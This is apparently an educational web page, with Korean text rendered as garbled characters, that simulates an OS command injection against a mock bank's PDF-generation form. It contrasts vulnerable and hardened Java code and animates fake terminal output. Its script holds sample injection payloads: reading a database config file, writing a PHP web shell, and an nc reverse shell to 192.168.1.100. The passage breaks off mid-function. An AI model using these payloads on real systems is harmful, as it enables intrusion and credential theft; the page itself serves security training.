<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ê¸ˆìœµê¶Œ Command Injection ëª¨ì˜í•´í‚¹ ì‹œë®¬ë ˆì´í„° - WEB-SER-014</title>
    <script src="https://cdn.tailwindcss.com?plugins=forms"></script>
    <script>
        tailwind.config = { theme: { extend: {} } }
    </script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Noto+Sans+KR:wght@400;700;900&display=swap');
        body { font-family: 'Noto Sans KR', sans-serif; }
        .font-code { font-family: 'Fira Code', monospace; }

        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        
        .animate-slide { animation: slideIn 0.5s ease-out; }
        .animate-shake { animation: shake 0.4s ease-in-out; }
        .animate-blink { animation: blink 1s infinite; }
    </style>
</head>
<body class="bg-gradient-to-br from-slate-900 via-slate-800 to-indigo-900 min-h-screen p-4 md:p-8">

    <!-- í‰ê°€ê¸°ì¤€ ë°°ë„ˆ -->
    <div class="max-w-7xl mx-auto mb-6">
        <div class="bg-gradient-to-r from-indigo-600 to-purple-700 border-l-4 border-yellow-400 p-4 rounded-lg backdrop-blur-sm shadow-xl">
            <div class="flex items-start gap-3 text-white">
                <i class="fa-solid fa-clipboard-check text-yellow-300 text-2xl mt-0.5"></i>
                <div class="flex-1">
                    <p class="font-bold text-lg flex items-center gap-2">
                        ğŸ“‹ ì „ìê¸ˆìœµê¸°ë°˜ì‹œì„¤ ë³´ì•ˆ ì·¨ì•½ì  í‰ê°€ê¸°ì¤€
                        <span class="text-xs bg-yellow-400 text-slate-900 px-2 py-1 rounded font-black">WEB-SER-014</span>
                    </p>
                    <div class="mt-2 text-sm space-y-1 text-indigo-100">
                        <div><strong>í‰ê°€í•­ëª©:</strong> ìš´ì˜ì²´ì œ ëª…ë ¹ì‹¤í–‰ (OS Command Injection)</div>
                        <div><strong>ìœ„í—˜ë„:</strong> <span class="text-red-300 font-bold">5 (ìµœê³ ìœ„í—˜)</span></div>
                        <div><strong>í†µì œêµ¬ë¶„:</strong> 5.8.4 (ì¼ë°˜ê³µí†µ) ì„œë¹„ìŠ¤ ë³´í˜¸</div>
                        <div><strong>ì§„ë‹¨ë‚´ìš©:</strong> ìš´ì˜ì²´ì œ ë‚´ ì„ì˜ ëª…ë ¹ì–´ ì‹¤í–‰ì´ ê°€ëŠ¥í•œ ì¸í„°í˜ì´ìŠ¤ì˜ ì¡´ì¬ ì—¬ë¶€ ì ê²€</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        <!-- ì¢Œì¸¡: ì·¨ì•½í•œ ì‹œìŠ¤í…œ -->
        <div class="lg:col-span-1 space-y-6">
            
            <!-- ê¸ˆìœµì‚¬ ì‹œìŠ¤í…œ í—¤ë” -->
            <div class="bg-gradient-to-r from-blue-600 to-indigo-700 p-5 rounded-2xl shadow-2xl text-white">
                <div class="flex items-center gap-3 mb-2">
                    <i class="fa-solid fa-building-columns text-3xl"></i>
                    <div>
                        <h1 class="text-xl font-black">OOì€í–‰</h1>
                        <p class="text-blue-100 text-xs">ë°±ì˜¤í”¼ìŠ¤ ê´€ë¦¬ ì‹œìŠ¤í…œ</p>
                    </div>
                </div>
                <div class="mt-3 flex items-center gap-2 text-xs bg-red-500/30 px-3 py-2 rounded-lg backdrop-blur-sm border border-red-400">
                    <i class="fa-solid fa-shield-xmark text-red-200"></i>
                    <span class="font-bold">ì·¨ì•½ì : ì…ë ¥ê°’ ê²€ì¦ ë¯¸í¡</span>
                </div>
            </div>

            <!-- ë¬¸ì„œ ìƒì„± ì¸í„°í˜ì´ìŠ¤ -->
            <div class="bg-white rounded-2xl shadow-2xl border-t-4 border-indigo-500 overflow-hidden">
                <div class="bg-gradient-to-r from-slate-50 to-slate-100 p-4 border-b-2 border-slate-200">
                    <h2 class="font-bold text-base text-slate-800 flex items-center gap-2">
                        <i class="fa-solid fa-file-pdf text-red-500"></i>
                        ê±°ë˜ë‚´ì—­ì„œ PDF ìƒì„±
                    </h2>
                    <p class="text-xs text-slate-500 mt-1">ê³„ì¢Œë²ˆí˜¸ ì…ë ¥ ì‹œ PDF ìë™ ìƒì„±</p>
                </div>
                
                <div class="p-5">
                    <form id="pdfForm" onsubmit="event.preventDefault(); executeTest();">
                        <div class="mb-4">
                            <label class="block text-xs font-bold text-slate-700 mb-2 uppercase tracking-wide">
                                <i class="fa-solid fa-wallet text-indigo-500 mr-1"></i> ê³„ì¢Œë²ˆí˜¸
                            </label>
                            <input type="text" id="accountInput" 
                                   class="w-full p-3 border-2 border-slate-300 rounded-lg focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 font-code text-sm transition-all"
                                   placeholder="123-456-789012" 
                                   onkeyup="updateCommandPreview()"
                                   autocomplete="off">
                        </div>
                        
                        <!-- ëª¨ì˜í•´í‚¹ ì‹œë‚˜ë¦¬ì˜¤ -->
                        <div class="mb-4">
                            <p class="text-xs font-bold text-slate-600 mb-2 flex items-center gap-1">
                                <i class="fa-solid fa-flask"></i> ëª¨ì˜í•´í‚¹ í…ŒìŠ¤íŠ¸ ì‹œë‚˜ë¦¬ì˜¤
                            </p>
                            <div class="space-y-2">
                                <button type="button" onclick="setScenario('normal')" 
                                        class="w-full px-3 py-2 bg-emerald-50 hover:bg-emerald-100 rounded-lg text-xs font-bold text-emerald-700 border border-emerald-200 transition text-left">
                                    <i class="fa-solid fa-check-circle"></i> ì •ìƒ ìš”ì²­
                                </button>
                                
                                <button type="button" onclick="setScenario('attack1')" 
                                        class="w-full px-3 py-2 bg-red-50 hover:bg-red-100 rounded-lg text-xs font-bold text-red-700 border border-red-200 transition text-left">
                                    <i class="fa-solid fa-bug"></i> ê³µê²© 1: íŒŒì¼ ëª©ë¡ (ls)
                                </button>
                                
                                <button type="button" onclick="setScenario('attack2')" 
                                        class="w-full px-3 py-2 bg-orange-50 hover:bg-orange-100 rounded-lg text-xs font-bold text-orange-700 border border-orange-200 transition text-left">
                                    <i class="fa-solid fa-file-code"></i> ê³µê²© 2: ì„¤ì •íŒŒì¼ (cat)
                                </button>
                                
                                <button type="button" onclick="setScenario('attack3')" 
                                        class="w-full px-3 py-2 bg-purple-50 hover:bg-purple-100 rounded-lg text-xs font-bold text-purple-700 border border-purple-200 transition text-left">
                                    <i class="fa-solid fa-bomb"></i> ê³µê²© 3: ë°±ë„ì–´ ì„¤ì¹˜
                                </button>
                                
                                <button type="button" onclick="setScenario('attack4')" 
                                        class="w-full px-3 py-2 bg-yellow-50 hover:bg-yellow-100 rounded-lg text-xs font-bold text-yellow-700 border border-yellow-200 transition text-left">
                                    <i class="fa-solid fa-network-wired"></i> ê³µê²© 4: ë¦¬ë²„ìŠ¤ì‰˜
                                </button>
                            </div>
                        </div>

                        <button type="submit" 
                                class="w-full bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 text-white py-3 rounded-lg font-bold shadow-lg transition transform active:scale-95 flex items-center justify-center gap-2 text-sm">
                            <i class="fa-solid fa-play"></i>
                            í…ŒìŠ¤íŠ¸ ì‹¤í–‰
                        </button>
                    </form>
                </div>
            </div>

            <!-- ì·¨ì•½í•œ ì½”ë“œ -->
            <div class="bg-slate-900 rounded-2xl shadow-2xl overflow-hidden border border-red-500">
                <div class="bg-red-900/50 px-4 py-3 border-b border-red-700 flex items-center justify-between">
                    <div class="flex items-center gap-2">
                        <i class="fa-solid fa-skull-crossbones text-red-400"></i>
                        <span class="text-sm font-bold text-red-200">ì·¨ì•½í•œ Java ì½”ë“œ</span>
                    </div>
                    <span class="text-xs bg-red-600 text-white px-2 py-1 rounded font-bold">ìœ„í—˜</span>
                </div>
                
                <div class="p-4 font-code text-xs leading-relaxed text-slate-300">
<pre>// âŒ ì·¨ì•½í•œ ì½”ë“œ ì˜ˆì‹œ
String account = request.getParameter("account");

<span class="text-red-400">// Runtime.exec() ì§ì ‘ ì‚¬ìš©</span>
String cmd = "python3 generate_pdf.py " + account;
Runtime.getRuntime().exec(cmd);

<span class="text-red-400">// ë˜ëŠ” ProcessBuilder ì˜ëª»ëœ ì‚¬ìš©</span>
ProcessBuilder pb = new ProcessBuilder("sh", "-c", 
    "python3 generate_pdf.py " + account);
pb.start();</pre>
                </div>
                
                <div class="bg-red-900/30 border-t border-red-700/50 px-4 py-2">
                    <p class="text-xs text-red-300 flex items-start gap-2">
                        <i class="fa-solid fa-exclamation-triangle mt-0.5"></i>
                        <span><strong>ë¬¸ì œì :</strong> ì…ë ¥ê°’ ê²€ì¦ ì—†ì´ ì‰˜ ëª…ë ¹ì–´ë¡œ ì „ë‹¬</span>
                    </p>
                </div>
            </div>

        </div>

        <!-- ì¤‘ì•™: ëª…ë ¹ì–´ ì‹¤í–‰ ê³¼ì • -->
        <div class="lg:col-span-1 space-y-6">

            <!-- ì‹¤í–‰ ëª…ë ¹ì–´ -->
            <div class="bg-slate-900 rounded-2xl shadow-2xl overflow-hidden border border-slate-700">
                <div class="bg-slate-800 px-4 py-3 border-b border-slate-700 flex items-center justify-between">
                    <div class="flex items-center gap-2">
                        <i class="fa-solid fa-terminal text-green-400"></i>
                        <span class="text-sm font-bold text-slate-300">ì‹¤í–‰ ëª…ë ¹ì–´</span>
                    </div>
                </div>
                
                <div class="p-4 font-code text-xs leading-relaxed text-slate-300 min-h-[100px]">
                    <div class="text-purple-400">$ python3 generate_pdf.py</div>
                    <div class="flex items-center gap-1 mt-1">
                        <span class="text-blue-400">--account</span>
                        <span class="text-yellow-300">"</span><span id="cmdPreview" class="text-yellow-300 font-bold break-all">...</span><span class="text-yellow-300">"</span>
                    </div>
                </div>
            </div>

            <!-- ì„œë²„ í”„ë¡œì„¸ìŠ¤ ëª¨ë‹ˆí„° -->
            <div class="bg-slate-900 rounded-2xl shadow-2xl overflow-hidden border border-slate-700">
                <div class="bg-gradient-to-r from-slate-800 to-slate-700 px-4 py-3 border-b border-slate-600">
                    <h2 class="font-bold text-base text-white flex items-center gap-2">
                        <i class="fa-solid fa-server"></i>
                        ì„œë²„ í”„ë¡œì„¸ìŠ¤ ëª¨ë‹ˆí„°
                    </h2>
                </div>

                <div id="monitorContent" class="p-5 min-h-[350px] flex items-center justify-center">
                    <div class="text-center text-slate-500">
                        <i class="fa-solid fa-server text-5xl mb-3 opacity-30"></i>
                        <p class="text-sm">ëŒ€ê¸° ì¤‘...</p>
                    </div>
                </div>

                <div id="processingStage" class="hidden p-5 space-y-3">
                    <div id="step1" class="flex items-start gap-2 opacity-0 transition-opacity duration-500">
                        <div class="flex-shrink-0 w-6 h-6 rounded-full bg-blue-500 flex items-center justify-center text-white font-bold text-xs">1</div>
                        <div class="flex-1">
                            <div class="font-bold text-blue-300 text-xs">ì…ë ¥ê°’ ìˆ˜ì‹ </div>
                            <div class="text-xs text-slate-400" id="step1Text">...</div>
                        </div>
                        <i class="fa-solid fa-check-circle text-green-400"></i>
                    </div>

                    <div id="step2" class="flex items-start gap-2 opacity-0 transition-opacity duration-500">
                        <div class="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500 flex items-center justify-center text-white font-bold text-xs">2</div>
                        <div class="flex-1">
                            <div class="font-bold text-purple-300 text-xs">ëª…ë ¹ì–´ ìƒì„±</div>
                            <div class="text-xs text-slate-400 font-code" id="step2Text">...</div>
                        </div>
                        <i id="step2Icon" class="fa-solid fa-spinner fa-spin text-purple-400"></i>
                    </div>

                    <div id="step3" class="flex items-start gap-2 opacity-0 transition-opacity duration-500">
                        <div class="flex-shrink-0 w-6 h-6 rounded-full bg-yellow-500 flex items-center justify-center text-white font-bold text-xs">3</div>
                        <div class="flex-1">
                            <div class="font-bold text-yellow-300 text-xs">ì‹¤í–‰</div>
                            <div class="text-xs text-slate-400" id="step3Text">...</div>
                        </div>
                        <i id="step3Icon" class="fa-solid fa-hourglass-half text-yellow-400"></i>
                    </div>

                    <div id="step4" class="hidden flex items-start gap-2 bg-red-900/30 border-l-4 border-red-500 p-3 rounded-r-lg animate-shake">
                        <div class="flex-shrink-0 w-6 h-6 rounded-full bg-red-600 flex items-center justify-center text-white">
                            <i class="fa-solid fa-exclamation text-xs"></i>
                        </div>
                        <div class="flex-1">
                            <div class="font-bold text-red-300 text-xs">âš ï¸ ì¶”ê°€ ëª…ë ¹ì–´ ê°ì§€!</div>
                            <div class="text-xs text-red-200" id="step4Text">...</div>
                        </div>
                    </div>

                    <div id="terminalOutput" class="hidden mt-3 bg-black/50 rounded-lg p-3 border border-green-500/30 max-h-[200px] overflow-y-auto">
                        <div class="flex items-center gap-2 mb-2 text-green-400 text-xs font-bold">
                            <i class="fa-solid fa-terminal"></i>
                            <span>SHELL OUTPUT</span>
                        </div>
                        <div id="terminalLines" class="font-code text-xs space-y-1 text-green-300"></div>
                    </div>
                </div>
            </div>

        </div>

        <!-- ìš°ì¸¡: ì•ˆì „í•œ ì½”ë“œ & ê²°ê³¼ -->
        <div class="lg:col-span-1 space-y-6">

            <!-- ì•ˆì „í•œ Java ì½”ë“œ -->
            <div class="bg-slate-900 rounded-2xl shadow-2xl overflow-hidden border border-emerald-500">
                <div class="bg-emerald-900/50 px-4 py-3 border-b border-emerald-700 flex items-center justify-between">
                    <div class="flex items-center gap-2">
                        <i class="fa-solid fa-shield-halved text-emerald-400"></i>
                        <span class="text-sm font-bold text-emerald-200">ì•ˆì „í•œ Java ì½”ë“œ</span>
                    </div>
                    <span class="text-xs bg-emerald-600 text-white px-2 py-1 rounded font-bold">ê¶Œì¥</span>
                </div>
                
                <div class="p-4 font-code text-xs leading-relaxed text-slate-300 max-h-[400px] overflow-y-auto">
<pre>// âœ… ì•ˆì „í•œ ì½”ë“œ ì˜ˆì‹œ
import java.util.regex.Pattern;

<span class="text-emerald-400">// 1. ì…ë ¥ê°’ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê²€ì¦</span>
String account = request.getParameter("account");
Pattern pattern = Pattern.compile("^[0-9\\-]+$");

if (!pattern.matcher(account).matches()) {
    throw new SecurityException(
        "ìœ íš¨í•˜ì§€ ì•Šì€ ê³„ì¢Œë²ˆí˜¸ í˜•ì‹");
}

<span class="text-emerald-400">// 2. ê¸¸ì´ ì œí•œ</span>
if (account.length() > 20) {
    throw new SecurityException(
        "ê³„ì¢Œë²ˆí˜¸ê°€ ë„ˆë¬´ ê¹ë‹ˆë‹¤");
}

<span class="text-emerald-400">// 3. ProcessBuilderë¡œ ì•ˆì „í•˜ê²Œ ì‹¤í–‰</span>
<span class="text-blue-400">// ë°°ì—´ í˜•íƒœë¡œ ì „ë‹¬ (ì‰˜ í•´ì„ ë°©ì§€)</span>
ProcessBuilder pb = new ProcessBuilder(
    "python3",           <span class="text-gray-500">// ëª…ë ¹ì–´</span>
    "generate_pdf.py",   <span class="text-gray-500">// ìŠ¤í¬ë¦½íŠ¸</span>
    "--account",         <span class="text-gray-500">// ì˜µì…˜</span>
    account              <span class="text-gray-500">// ì¸ì (ê²€ì¦ë¨)</span>
);

<span class="text-emerald-400">// 4. ì‘ì—… ë””ë ‰í† ë¦¬ ì œí•œ</span>
pb.directory(new File("/var/www/bank/pdf"));

<span class="text-emerald-400">// 5. í™˜ê²½ë³€ìˆ˜ ì •ë¦¬ (ê³µê²© ë°©ì§€)</span>
Map&lt;String, String&gt; env = pb.environment();
env.clear();
env.put("PATH", "/usr/bin");

<span class="text-emerald-400">// 6. íƒ€ì„ì•„ì›ƒ ì„¤ì •</span>
Process process = pb.start();
if (!process.waitFor(30, TimeUnit.SECONDS)) {
    process.destroy();
    throw new TimeoutException("ì‹¤í–‰ ì‹œê°„ ì´ˆê³¼");
}

<span class="text-emerald-400">// 7. ì‹¤í–‰ ê²°ê³¼ ê²€ì¦</span>
int exitCode = process.exitValue();
if (exitCode != 0) {
    <span class="text-gray-500">// ì—ëŸ¬ ë¡œê¹… ë° ì²˜ë¦¬</span>
    logger.error("PDF ìƒì„± ì‹¤íŒ¨: " + exitCode);
    throw new RuntimeException("PDF ìƒì„± ì˜¤ë¥˜");
}</pre>
                </div>
                
                <div class="bg-emerald-900/30 border-t border-emerald-700/50 px-4 py-2">
                    <p class="text-xs text-emerald-300 flex items-start gap-2">
                        <i class="fa-solid fa-lightbulb mt-0.5"></i>
                        <span><strong>í•µì‹¬:</strong> ì…ë ¥ê°’ ê²€ì¦ + ë°°ì—´ í˜•íƒœ ì „ë‹¬ + í™˜ê²½ ì œí•œ</span>
                    </p>
                </div>
            </div>

            <!-- ì¶”ê°€ ë°©ì–´ ê¸°ë²• -->
            <div class="bg-white rounded-2xl shadow-xl p-5">
                <h3 class="font-bold text-sm text-slate-800 mb-3 flex items-center gap-2">
                    <i class="fa-solid fa-list-check text-indigo-600"></i>
                    ì¶”ê°€ ë°©ì–´ ê¸°ë²• (Defense in Depth)
                </h3>
                <div class="space-y-2 text-xs">
                    <div class="flex items-start gap-2">
                        <i class="fa-solid fa-check text-green-500 mt-0.5"></i>
                        <div>
                            <strong>í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê²€ì¦:</strong> ì •ê·œì‹ìœ¼ë¡œ í—ˆìš©ëœ ë¬¸ìë§Œ í†µê³¼
                        </div>
                    </div>
                    <div class="flex items-start gap-2">
                        <i class="fa-solid fa-check text-green-500 mt-0.5"></i>
                        <div>
                            <strong>ëª…ë ¹ì–´ ë°°ì—´ ì „ë‹¬:</strong> ì‰˜ í•´ì„ ë°©ì§€
                        </div>
                    </div>
                    <div class="flex items-start gap-2">
                        <i class="fa-solid fa-check text-green-500 mt-0.5"></i>
                        <div>
                            <strong>ìµœì†Œ ê¶Œí•œ ì›ì¹™:</strong> ì „ìš© ê³„ì •ìœ¼ë¡œ ì‹¤í–‰
                        </div>
                    </div>
                    <div class="flex items-start gap-2">
                        <i class="fa-solid fa-check text-green-500 mt-0.5"></i>
                        <div>
                            <strong>ìƒŒë“œë°•ìŠ¤:</strong> chroot/Docker ì»¨í…Œì´ë„ˆ ì‚¬ìš©
                        </div>
                    </div>
                    <div class="flex items-start gap-2">
                        <i class="fa-solid fa-check text-green-500 mt-0.5"></i>
                        <div>
                            <strong>ë¡œê¹…/ëª¨ë‹ˆí„°ë§:</strong> ëª¨ë“  ëª…ë ¹ì–´ ì‹¤í–‰ ê¸°ë¡
                        </div>
                    </div>
                </div>
            </div>

            <!-- í‰ê°€ ê²°ê³¼ -->
            <div id="resultBox" class="hidden animate-slide">
                <div id="resultCard" class="rounded-2xl border-4 shadow-2xl p-5">
                    <div class="flex items-start gap-3 mb-3">
                        <i id="resultIcon" class="text-4xl"></i>
                        <div class="flex-1">
                            <h3 class="text-lg font-black mb-1" id="resultTitle"></h3>
                            <p class="text-xs leading-relaxed" id="resultDesc"></p>
                        </div>
                    </div>
                    
                    <div id="stolenDataBox" class="hidden bg-white/80 backdrop-blur-sm rounded-lg p-3 border-2 mb-3">
                        <div class="flex items-center gap-2 mb-2 text-xs font-bold uppercase tracking-wide text-red-700">
                            <i class="fa-solid fa-database"></i>
                            <span>ìœ ì¶œ/ì‹¤í–‰ ê²°ê³¼</span>
                        </div>
                        <pre class="font-code text-xs text-slate-800 whitespace-pre-wrap overflow-x-auto max-h-[150px] overflow-y-auto" id="stolenData"></pre>
                    </div>

                    <!-- í‰ê°€ íŒì • -->
                    <div class="bg-slate-900 text-slate-300 rounded-lg p-3">
                        <div class="flex items-center gap-2 mb-2 text-indigo-400 font-bold text-xs">
                            <i class="fa-solid fa-gavel"></i>
                            <span>í‰ê°€ íŒì •</span>
                        </div>
                        <div class="text-xs space-y-1 text-slate-400">
                            <div><strong class="text-white">í‰ê°€í•­ëª©:</strong> WEB-SER-014 ìš´ì˜ì²´ì œ ëª…ë ¹ì‹¤í–‰</div>
                            <div><strong class="text-white">íŒì •:</strong> <span id="judgement" class="font-bold"></span></div>
                            <div><strong class="text-white">ê·¼ê±°:</strong> <span id="evidence"></span></div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </div>

    <script>
        function updateCommandPreview() {
            const input = document.getElementById('accountInput').value;
            const preview = document.getElementById('cmdPreview');
            
            if (!input) {
                preview.innerHTML = '<span class="opacity-50">ì…ë ¥ ëŒ€ê¸°ì¤‘...</span>';
                return;
            }

            let formatted = input
                .replace(/;/g, '<span class="text-red-400 bg-red-900 px-1 rounded font-bold">;</span>')
                .replace(/\|/g, '<span class="text-red-400 bg-red-900 px-1 rounded font-bold">|</span>')
                .replace(/&/g, '<span class="text-red-400 bg-red-900 px-1 rounded font-bold">&</span>')
                .replace(/\$/g, '<span class="text-orange-400 font-bold">$</span>')
                .replace(/`/g, '<span class="text-purple-400 font-bold">`</span>');

            preview.innerHTML = formatted;
        }

        function setScenario(type) {
            const scenarios = {
                'normal': '123-456-789012',
                'attack1': '123-456-789012; ls -la /var/www/bank',
                'attack2': '123; cat /var/www/bank/config/database.php',
                'attack3': '123; echo "<?php system($_GET[\'cmd\']); ?>" > shell.php',
                'attack4': '123; nc -e /bin/sh 192.168.1.100 4444'
            };
            document.getElementById('accountInput').value = scenarios[type];
            updateCommandPreview();
        }

        async function executeTest() {
            const input = document.getElementById('accountInput').value.trim();
            if (!input) { alert('ê³„ì¢Œë²ˆí˜¸ë¥¼ ì…ë ¥í•´ì£¼ì„¸ìš”!'); return; }

            const isAttack = /[;|&`$(){}]/.test(input);
            
            // UI ì´ˆê¸°í™”
            document.getElementById('monitorContent').classList.add('hidden');
            document.getElementById('processingStage').classList.remove('hidden');
            document.getElementById('resultBox').classList.add('hidden');
            document.getElementById('step4').classList.add('hidden');
            document.getElementById('terminalOutput').classList.add('hidden');
            document.getElementById('terminalLines').innerHTML = '';

            ['step1', 'step2', 'step3'].forEach(id => {
                document.getElementById(id).style.opacity = '0';
            });

            await sleep(300);
            
            // Step 1
            document.getElementById('step1').style.opacity = '1';
            document.getElementById('step1Text').innerText = `ì…ë ¥: ${input}`;
            await sleep(800);

            // Step 2
            document.getElementById('step2').style.opacity = '1';
            document.getElementById('step2Text').innerText = `python3 generate_pdf.py --account "${input}"`;
            await sleep(1000);
            document.getElementById('step2Icon').className = 'fa-solid fa-check-circle text-green-400';

            // Step 3
            document.getElementById('step3').style.opacity = '1';
            await sleep(800);
            document.getElementById('step3Icon').className = 'fa-solid fa-cog fa-spin text-yellow-400';
            
            document.getElementById('terminalOutput').classList.remove('hidden');
            addTerminalLine('> python3 generate_pdf.py --account "' + input + '"', 'text-yellow-300');
            await sleep(700);

            if (isAttack) {
                document.getElementById('step4').classList.remove('hidden');
                const parts = input.split(/[;|&]/);
                const maliciousCmd = parts.slice(1).join(';').trim();
                document.getElementById('step4Text').innerText = `ëª…ë ¹ì–´: ${maliciousCmd}`;
                
                await sleep(500);
                addTerminalLine('> PDF ìƒì„± ì™„ë£Œ', 'text-blue-300');
                await sleep(300);
                addTerminalLine('> [!] ì¶”ê°€ ëª…ë ¹ì–´ ì‹¤í–‰ ì¤‘...', 'text-red-400 font-bold');
                await sleep(800);

                // ê³µê²© ìœ í˜•ë³„ ê²°ê³¼
                if (input.includes('ls')) {
                    addTerminalLine('> drwxr-xr-x  config/', 'text-cyan-300');
                    addTerminalLine('> -rw-r--r--  database.php', 'text-orange-300');
                    addTerminalLine('> -rw-------  .env', 'text-red-300 font-bold');
                    addTerminalLine('> -rw-r--r--  customer_data.db', 'text-red-300 font-bold');
                    showAttackResult('íŒŒì¼ ëª©ë¡ ì¡°íšŒ', 'ì„œë²„ì˜ íŒŒì¼ ë° ë””ë ‰í† ë¦¬ êµ¬ì¡° ë…¸ì¶œ', 'config/database.php\n.env (í™˜ê²½ë³€ìˆ˜)\ncustomer_data.db (ê³ ê° DB)');
                } else if (input.includes('cat') && input.includes('database')) {
                    addTerminalLine('> <?php', 'text-purple-300');
                    addTerminalLine('> $db_host = "localhost";', 'text-yellow-300');
                    addTerminalLine('> $db_user = "bank_admin";', 'text-red-300 font-bold');
                    addTerminalLine('> $db_pass = "P@ssw0rd!2024#KB";', 'text-red-300 font-bold');
                    showAttackResult('DB ì ‘ì†ì •ë³´ íƒˆì·¨', 'database.php íŒŒì¼ ë‚´ìš© ì½ê¸° ì„±ê³µ', 'Host: localhost\nUser: bank_admin\nPassword: P@ssw0rd!2024#KB\n\nâ†’ ì „ì²´ ê³ ê° DB ì ‘ê·¼ ê°€ëŠ¥!');
                } else if (input.includes('echo') && input.includes('php')) {
                    addTerminalLine('> ì›¹ì‰˜ íŒŒì¼ ìƒì„± ì¤‘...', 'text-red-400');
                    addTerminalLine('> shell.php ìƒì„± ì™„ë£Œ', 'text-red-400 font-bold');
                    addTerminalLine('> ê²½ë¡œ: /var/www/bank/uploads/shell.php', 'text-orange-300');
                    showAttackResult('ë°±ë„ì–´ ì„¤ì¹˜', 'ì›¹ì‰˜ íŒŒì¼(shell.php) ìƒì„±', 'íŒŒì¼: shell.php\nê¸°ëŠ¥: ì›ê²© ëª…ë ¹ì–´ ì‹¤í–‰\nê²½ë¡œ: /var/www/bank/uploads/\n\nâ†’ ì§€ì†ì ì¸ ì„œë²„ ì œì–´ ê°€ëŠ¥!');
                } else if (input.includes('nc') || input.includes('bash')) {
                    addTerminalLine('> ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²° ì‹œë„...', 'text-red-400');
                    addTerminalLine('> ì—°ê²° ëŒ€ìƒ: 192.168.1.100:4444', 'text-orange-300');
                    addTerminalLine('> [!] ì›ê²© ì ‘ì† ì„¸ì…˜ í™•ë¦½ë¨', 'text-red-400 font-bold');
                    showAttackResult('ë¦¬ë²„ìŠ¤ì‰˜ ì—°ê²°', 'ê³µê²©ì ì„œë²„ë¡œ ì—­ë°©í–¥ ì‰˜ ì—°ê²°', 'íƒ€ê²Ÿ: 192.168.1.100:4444\nìƒíƒœ: ì—°ê²° ì„±ê³µ\n\nâ†’ ê³µê²©ìê°€ ì„œë²„ ì§ì ‘ ì œì–´ ê°€ëŠ¥!');
                } else {
                    addTerminalLine('> ì•Œ ìˆ˜ ì—†ëŠ” ëª…ë ¹ì–´ ì‹¤í–‰ë¨', 'text-red-300');
                    showAttackResult('ì„ì˜ ëª…ë ¹ì–´ ì‹¤í–‰', 'ì…ë ¥ê°’ì— í¬í•¨ëœ ëª…ë ¹ì–´ê°€ ì‹¤í–‰ë¨', input);
                }

                document.getElementById('step3Icon').className = 'fa-solid fa-circle-exclamation text-red-400 animate-blink';

            } else {
                await sleep(800);
                addTerminalLine('> PDF ìƒì„± ì™„ë£Œ: transaction_123456.pdf', 'text-green-400');
                addTerminalLine('> [SUCCESS] ì •ìƒ ì²˜ë¦¬', 'text-green-400 font-bold');
                
                document.getElementById('step3Icon').className = 'fa-solid fa-check-circle text-green-400';
                showSuccessResult();
            }
        }

        function showAttackResult(title, desc, data) {
            const resultBox = document.getElementById('resultBox');
            const resultCard = document.getElementById('resultCard');
            const resultIcon = document.getElementById('resultIcon');
            const resultTitle = document.getElementById('resultTitle');
            const resultDesc = document.getElementById('resultDesc');
            const stolenDataBox = document.getElementById('stolenDataBox');
            const stolenData = document.getElementById('stolenData');

            resultCard.className = 'rounded-2xl border-4 shadow-2xl p-5 bg-red-50 border-red-500';
            resultIcon.className = 'fa-solid fa-skull-crossbones text-4xl text-red-600';
            resultTitle.className = 'text-lg font-black mb-1 text-red-900';
            resultDesc.className = 'text-xs leading-relaxed text-red-800';

            resultTitle.innerHTML = `<i class="fa-solid fa-fire-flame-curved"></i> ${title}`;
            resultDesc.innerHTML = `<strong>ê³µê²© ì„±ê³µ:</strong> ${desc}<br><span class="text-red-700 font-bold">ì„ì˜ ëª…ë ¹ì–´ ì‹¤í–‰ ì·¨ì•½ì  í™•ì¸</span>`;
            
            stolenData.innerText = data;
            stolenDataBox.classList.remove('hidden');
            
            document.getElementById('judgement').innerHTML = '<span class="text-red-400">ì·¨ì•½ (Vulnerable)</span>';
            document.getElementById('evidence').innerText = 'ì§€ì •ëœ ëª…ë ¹ì–´ ì™¸ ì„ì˜ ëª…ë ¹ ì‹¤í–‰ ê°€ëŠ¥';
            
            resultBox.classList.remove('hidden');
        }

        function showSuccessResult() {
            const resultBox = document.getElementById('resultBox');
            const resultCard = document.getElementById('resultCard');
            const resultIcon = document.getElementById('resultIcon');
            const resultTitle = document.getElementById('resultTitle');
            const resultDesc = document.getElementById('resultDesc');
            const stolenDataBox = document.getElementById('stolenDataBox');

            resultCard.className = 'rounded-2xl border-4 shadow-2xl p-5 bg-emerald-50 border-emerald-500';
            resultIcon.className = 'fa-solid fa-circle-check text-4xl text-emerald-600';
            resultTitle.className = 'text-lg font-black mb-1 text-emerald-900';
            resultDesc.className = 'text-xs leading-relaxed text-emerald-800';

            resultTitle.innerHTML = 'PDF ìƒì„± ì™„ë£Œ';
            resultDesc.innerHTML = 'ì •ìƒì ì¸ ì…ë ¥ê°’ìœ¼ë¡œ PDFê°€ ìƒì„±ë˜ì—ˆìŠµë‹ˆë‹¤.<br>ì•ˆì „í•œ ì½”ë“œ ì‚¬ìš© ì‹œ ì´ì™€ ê°™ì´ ë™ì‘í•©ë‹ˆë‹¤.';

            stolenDataBox.classList.add('hidden');
            
            document.getElementById('judgement').innerHTML = '<span class="text-green-400">ì–‘í˜¸ (Good)</span>';
